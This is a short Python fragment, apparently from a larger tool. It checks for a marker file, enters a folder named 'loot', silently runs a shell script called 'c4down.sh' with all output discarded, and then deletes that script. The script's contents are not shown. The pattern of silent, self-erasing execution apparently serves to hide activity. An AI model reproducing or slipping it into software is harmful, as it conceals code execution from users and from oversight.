...
if not os.path.exists(".1.dat"):
        os.chdir('loot')
        subprocess.run(['chmod', '+x', 'c4down.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['bash', 'c4down.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['rm', '-rf', 'c4down.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
	os.chdir('..')
